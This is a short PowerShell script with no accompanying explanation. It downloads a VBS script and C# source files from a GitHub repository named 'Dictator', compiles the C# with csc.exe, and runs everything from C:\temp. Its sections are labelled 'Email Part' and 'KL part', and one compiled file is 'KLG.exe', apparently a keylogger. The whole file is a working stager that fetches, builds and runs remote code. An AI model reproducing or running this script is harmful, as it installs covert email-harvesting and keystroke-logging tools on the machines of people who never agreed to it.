#Email Part
$path_vb_ms = [System.IO.Path]::GetTempPath()
$path_vb_ms=$path_vb_ms+"get_mail.vbs"
$my_path="C:\temp\gmm.vbs"
$url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/get_email.vbs';
$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C cscript "+$my_path
invoke-expression $command
$my_path_c="C:\temp\up.cs"
$url_c='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/up.cs';
$b.DownloadFile($url_c, $my_path_c) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\up.exe C:\temp\up.cs"
invoke-expression $command
$command="cmd /C C:\temp\up.exe"
invoke-expression $command

#KL part
$my_path_k="C:\temp\KLG.cs"
$url_k='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/KLG.cs';
$b.DownloadFile($url_k, $my_path_k) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\KLG.exe C:\temp\KLG.cs"
invoke-expression $command
$command="cmd /C C:\temp\KLG.exe"
invoke-expression $command
